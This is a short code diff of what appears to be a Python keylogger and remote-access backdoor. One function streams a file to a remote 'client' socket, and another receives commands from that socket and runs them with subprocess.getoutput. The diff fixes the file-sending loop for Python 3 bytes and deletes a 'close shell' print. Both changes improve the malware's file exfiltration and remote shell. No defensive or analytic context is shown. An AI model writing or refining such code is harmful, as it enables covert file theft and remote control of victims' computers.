@@ -75,7 +75,7 @@ def keypressed(event):
 def transfer(s):
     f = open(FILE_NAME, 'rb')
     packet = f.read(1024*1024)#1MB
-    while packet != '':
+    while packet != b'':
         client.send(packet) 
         packet = f.read(1024*1024)
     f.close()
@@ -94,7 +94,6 @@ def get_shell(s):
     while True:
         command = client.recv(1024*1024).decode()
         if 'close' in command:
-            print('close shell')
             break
 
         output = subprocess.getoutput(command)
